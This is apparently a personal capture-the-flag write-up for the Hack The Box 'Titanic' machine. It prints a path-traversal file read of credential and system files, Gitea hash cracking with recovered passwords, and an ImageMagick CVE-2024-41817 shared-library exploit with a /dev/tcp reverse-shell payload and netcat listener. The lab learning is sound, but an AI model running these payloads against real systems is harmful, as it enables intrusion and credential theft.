---
title: 'Season 7 - Titanic'
description: 'Writeup for Titanic box'
pubDate: 'Feb 26 2025'
heroImage: 'blog-placeholder-4.jpg'
---

**Difficulty: Easy**

## Information Gathering

### Port scan

```bash
kali$ nmap -sV -sC $TARGET

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.32 seconds
```

## Enumeration  

### Web server - `titanic.htb`
Running on host `titanic.htb`. So let's add it to our `/etc/hosts` file and begin exploring the site. 

Http response header:
`Server: Werkzeug/3.0.3 Python/3.10.12`

#### Path enumeration
After poking around a bit, we see there's only one page but with a form to book a trip. Let's enumerate the site to see if there's any interesting paths.

```bash
kali$ gobuster dir -u http://titanic.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://titanic.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 400) [Size: 41]
/book                 (Status: 405) [Size: 153]
/server-status        (Status: 403) [Size: 276]
```

Let's dig in to these endpoints. Once we book a trip via `POST /book`, a JSON file is downloaded from a `/download` endpoint. Examining these requests in Burpsuite don't raise any immediate red flags.

The flow looks like:

```bash
# Request 1
POST /book
Host: titanic.htb
Cintent-Type: application/x-www-form-urlencoded
...

name=a&email=a%40a.com&phone=1234567890&date=2025-02-28&cabin=Suite

# Response 1
Redirecting you to /download?ticket=<uuid>.json

# Request 2
GET /download?ticket=e3b22b09-33ad-434f-9d10-f022cf07efc4.json HTTP/1.1
Host: titanic.htb

# Response 2
...
'{ "name": "a", "email": "a@a.com", "phone": "1234567890", "date": "2025-02-28", "cabin": "Standard"}'
```

When looking at this, it does seem odd that the `.json` prefix is required. By removing the prefix, we see the response `404 Ticket not found`. Interesting... I suspect this site may be vulnerable to a local file inclusion vulnerability. Let's try another file:

```bash
GET http://titanic.htb/download?ticket=/etc/hosts

## Response
HTTP/1.1 200 OK
Date: Wed, 26 Feb 2025 01:06:48 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="/etc/hosts"
Content-Type: application/octet-stream
Content-Length: 250
Last-Modified: Fri, 07 Feb 2025 12:04:36 GMT
Cache-Control: no-cache
ETag: "1738929876.3570278-250-324273100"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Aha! We've downloaded the hosts file. Interestingly the file contents are in the body of the response, which would imply that the web server is opening and reading the file.

Let's use gobuster to enumerate

```bash
kali$ gobuster dir -u http://titanic.htb/download?ticket=/var/www/html -w /usr/share/wordlists/dirb/common.txt

/index.html         (Status: 200)  [Size: 303]
```

This is the default apache page... No luck.

Trying to download `../app.py` was successful. From here we can infer some info about the directory structure:
```
webroot/
|- app.py
|- templates/
|  |- index.html
|- tickets/
   |- *.json
```

Inspecting the code, we confirm the web app only contains `/`, `/book` and `/download`. It stores tickets in the `tickets` subdirectory and does not validate the path when retrieving a ticket file. There's no secrets in this file, so we need to continue the hunt on how to exploit...

### Subdomain - `dev.titanic.htb`
It seems common practice with LFI to extract a bunch of common files such as `/etc/passwd`, `/etc/hosts`, `/etc/shadow` if permissions allow, `/etc/issue` or `/etc/os-release`. There's also some procs `/proc/version`, `/proc/cpuinfo`, and `/proc/meminfo`.

We were able to extract the `passwd` and `hosts` file successfully. Inspecting the hosts file, we find a `dev.titanic.htb` subdomain! A new site for us to explore. It's a self-hosted git service `gitea`. It has 2 repositories:
* `flask-app` which is the code for the `titanic.htb` site; and
* `docker-config`

Exploring docker-config, there are 2 folders: one for the Gitea service, and another for a MySQL db. It's very likely that this is the source for the services and code running on the box. We can explore these files to find out more about the filesystem.

**Gitea**  
The path on the local machine is `/home/developer/gitea/data`. Since this is an OSS project, let's go look it up online.

The config file is stored in the data directory: `.../data/gitea/conf/app.ini`, and from this we gather:
* `data/gitea/gitea.db`
   * Hashes for the users Admin and developer
* A other few secrets

**MySQL**  
The MySQL service is exposed on port `3306` of the host. The MySQL dockerfile has the credentials and details hardcoded in the file:

```yaml
MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
MYSQL_DATABASE: ticket 
MYSQL_USER: sql_svc
MYSQL_PASSWORD: sql_password
```

## Exploitation

### LFI
**User enumeration**  
Having discovered the site was vulnerable to LFI earlier, we can extract the `/etc/passwd` file to see what users exist. 

```
root:x:0:0:root:/root:/bin/bash
...
developer:x:1000:1000:developer:/home/developer:/bin/bash
...
```

**Hash dump**  
Based on the Gitea db file, we can extract the hashes for the Administrator and Developer users (using giteatohashcat, like everyone else doing this box):
```
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

Running through hashcat, we get the password for the developer user: `developer:25282528`. (N.b. to get the cracked hash to show, you need to give in the same options you did at the start).

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt  --user --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

## Privilege Escalation

Initially, I tried to look for any programs with a SUID or SGID bit set. (`find / -perm /{2000|4000|6000} 2>/dev/null`). Nothing looked particularly interesting here. Additionally, checking sudo privileges via `sudo -l` yielded nothing.

At this point, a lot of the writeups just simply decide to check out the `/opt` directory. Why? I don't know. My guess is it's a commonplace to store some temporary scripts... After some research, it looks like this is the place to drop in external software packages that are self-contained and don't adhere to the Linux approach of using the `bin` and `lib` folders.

Looking at `/opt`, we see a folder containing the web app from the start, a `containerd` directory and a `scripts` directory that contains a bash file `identify_images.sh`. It is making use of `/usr/bin/magick`.

ImageMagick is on version `7.1.1-35`, compiled by gcc 9.4. A quick search online reveals this is vulnerable to `CVE-2024-41817` which has the potential of arbitrary code execution. Based on the [security advisory](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8), it seems that if ImageMagick version `7.0.9` doesn't exist, then it results in an empty path being added to some environment variables, opening up the potential that config files will be loaded from the current working directory.

Using the second example in the advisory, we can get an interactive shell session by the following. However, this only gets us a shell as developer user.

```bash
developer@titanic: gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
```

### Thinking hard
This means we need to get the root user to execute this, somehow. Initial thoughts:
* `/opts/identify_images.sh` used magick and had some reference to the web app we started with
* If the web app is running as root user *and* the web app invokes magick, it means we have control over when magick gets invoked
* If we place our malicious shared library in the same working directory as where magick is getting invoked, it can create a shell session
* But how do we get access to that?
* We have arbitrary command execution. We can set up a reverse shell.
* But where and when does the script get invoked? On startup?

After some more thinking, I am stumped. We can put in an arbitrary command, but how on earth does it get executed by a user with higher permissions? So far, I've tried to look into how the `identify_images.sh` script is being invoked:
* cronjobs. None exist
* watching the images folder for changes. Nothing in systemd, and no reference to `inotify`
* by the code. `grep -r "identify_images.sh" /opt/app` yielded no results. 

What's more - none of the writeups online explain this either... They only show the payload, the compilation step, and then elevated access. Where does the shared library get invoked?!

Potentially there is a cronjob scheduled as root that is not visible to the developer user. Let's try and update the shared lib with a reverse shell payload.

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'");
    exit(0);
}
EOF
```

A ha! There is a secret cron job.

```bash
kali$ nc -lvnp 1337
listening on [any] 1337 ...

connect to [10.10.14.105] from (UNKNOWN) [10.10.11.55] 33620
bash: cannot set terminal process group (302077): Inappropriate ioctl for device
bash: no job control in this shell
root@titanic:/opt/app/static/assets/images#whoami
root
```

## Post-Exploitation

### User flag
Using LFI, we can extract the `/etc/passwd` file to see what users exist. From here we see a user named `developer` exists. We can then use the download endpoint to get the file

```bash
GET http://titanic.htb/download?ticket=/home/developer/user.txt
<flag>
```

### Root flag

```bash
root@titanic:/opt/app/static/assets/images#whoami
root
root@titanic:/opt/app/static/assets/images# cat /root/root.txt
cat /root/root.txt
<flag>
```



## Notes & References

Personal reflections:
* I got a decent way through the enumeration without help. Hit a stumbling block with the hash cracking (especially since I didn't recognise the output when it had cracked the developer hash + I didn't correctly use the `--show` option. Could've saved some big time here!).
* I also hit a stumbling block with the privilege escalation. I think I need to spend some time learning about that. HTB's privesc course should be a good starting point.

To research: does Gitea make use of system hashes, or was this simply a case of poor security measures by the user to reuse the same password?